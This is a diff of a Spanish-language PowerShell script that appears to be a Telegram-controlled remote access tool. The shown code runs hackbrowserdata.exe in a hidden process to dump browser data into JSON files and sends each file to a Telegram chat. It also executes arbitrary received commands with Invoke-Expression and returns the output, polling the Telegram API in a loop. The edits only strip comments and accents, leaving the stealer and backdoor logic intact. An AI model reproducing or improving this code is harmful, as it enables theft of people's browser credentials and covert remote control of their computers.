@@ -163,12 +163,10 @@ function Ejecutar-HackBrowserData {
     }
     
     try {
-        # Crear directorio temporal para los resultados
         $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
         $tempDir = "$env:TEMP\BrowserData_$timestamp"
         New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
         
-        # Verificar si hackbrowserdata.exe existe en el mismo directorio del script
         $scriptDir = Split-Path -Parent $MyInvocation.ScriptName
         if ([string]::IsNullOrEmpty($scriptDir)) {
             $scriptDir = (Get-Location).Path
@@ -176,14 +174,13 @@ function Ejecutar-HackBrowserData {
         
         $hackBrowserPath = Join-Path $scriptDir "hackbrowserdata.exe"
         
-        # Si no está en el directorio del script, buscar en el directorio actual
         if (-not (Test-Path $hackBrowserPath)) {
             $hackBrowserPath = ".\hackbrowserdata.exe"
         }
         
         if (-not (Test-Path $hackBrowserPath)) {
             if (-not $silencioso) {
-                Enviar-Mensaje -chatId $chatId -texto "Error: No se encontró hackbrowserdata.exe"
+                Enviar-Mensaje -chatId $chatId -texto "Error: No se encontro hackbrowserdata.exe"
             }
             Add-Content $LogPath "hackbrowserdata.exe no encontrado"
             return $false
@@ -191,7 +188,6 @@ function Ejecutar-HackBrowserData {
         
         Add-Content $LogPath "Ejecutando: $hackBrowserPath"
         
-        # Configurar proceso oculto
         $psi = New-Object System.Diagnostics.ProcessStartInfo
         $psi.FileName = $hackBrowserPath
         $psi.Arguments = "-f json -dir `"$tempDir`""
@@ -202,7 +198,6 @@ function Ejecutar-HackBrowserData {
         $psi.RedirectStandardOutput = $true
         $psi.RedirectStandardError = $true
         
-        # Ejecutar el proceso
         $process = [System.Diagnostics.Process]::Start($psi)
         $process.WaitForExit()
         
@@ -213,12 +208,11 @@ function Ejecutar-HackBrowserData {
         Add-Content $LogPath "HackBrowserData stderr: $stderr"
         Add-Content $LogPath "Exit code: $($process.ExitCode)"
         
-        # Buscar archivos JSON generados
         $archivosJSON = Get-ChildItem -Path $tempDir -Filter "*.json" -Recurse -ErrorAction SilentlyContinue
         
         if ($archivosJSON.Count -eq 0) {
             if (-not $silencioso) {
-                Enviar-Mensaje -chatId $chatId -texto "No se generaron archivos JSON. Verifica que los navegadores estén instalados."
+                Enviar-Mensaje -chatId $chatId -texto "No se generaron archivos JSON. Verifica que los navegadores esten instalados."
             }
             Add-Content $LogPath "No se encontraron archivos JSON"
             Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
@@ -227,7 +221,6 @@ function Ejecutar-HackBrowserData {
         
         Add-Content $LogPath "Archivos encontrados: $($archivosJSON.Count)"
         
-        # Enviar cada archivo JSON
         $enviados = 0
         $errores = @()
         
@@ -236,7 +229,6 @@ function Ejecutar-HackBrowserData {
             $nombreConTimestamp = "$($archivo.BaseName)_$timestamp.json"
             $rutaRenombrado = Join-Path $archivo.DirectoryName $nombreConTimestamp
             
-            # Renombrar con timestamp para evitar sobrescrituras
             Rename-Item -Path $archivo.FullName -NewName $nombreConTimestamp -Force
             
             $caption = "[$nombreOriginal] - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
@@ -253,12 +245,11 @@ function Ejecutar-HackBrowserData {
             Start-Sleep -Milliseconds 300
         }
         
-        # Limpiar directorio temporal
         Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
         
-        $mensaje = "Extracción completada.`nArchivos enviados: $enviados"
+        $mensaje = "Extraccion completada. Archivos enviados: $enviados"
         if ($errores.Count -gt 0) {
-            $mensaje += "`nErrores: $($errores.Count)"
+            $mensaje += " Errores: $($errores.Count)"
         }
         
         if (-not $silencioso) {
@@ -307,7 +298,7 @@ function Ejecutar-Comando {
         
         $salida = Invoke-Expression $comando 2>&1 | Out-String
         
-        $resultado = "Directorio: $dirActual`n$("="*50)`n$salida"
+        $resultado = "Directorio: $dirActual`n$('='*50)`n$salida"
         
         if ([string]::IsNullOrWhiteSpace($salida)) {
             $resultado += "(Sin salida)"
@@ -330,7 +321,7 @@ function Listar-Directorio {
         $dirActual = Obtener-DirectorioActual
         $items = Get-ChildItem | Select-Object Mode, LastWriteTime, Length, Name | Format-Table -AutoSize | Out-String
         
-        $resultado = "Directorio: $dirActual`n$("="*50)`n$items"
+        $resultado = "Directorio: $dirActual`n$('='*50)`n$items"
         Enviar-Mensaje -chatId $chatId -texto "``````$resultado``````"
     } catch {
         Enviar-Mensaje -chatId $chatId -texto "Error listando directorio: $_"
@@ -373,7 +364,7 @@ while ($true) {
     
     try {
         $offset = $LastUpdateId + 1
-        $url = "$ApiUrl/getUpdates?offset=$offset" + "&limit=5"
+        $url = "$ApiUrl/getUpdates?offset=$offset&limit=5"
         $res = Invoke-RestMethod -Uri $url -Method Get -TimeoutSec 20
         
         if ($res.ok -and $res.result.Count -gt 0) {
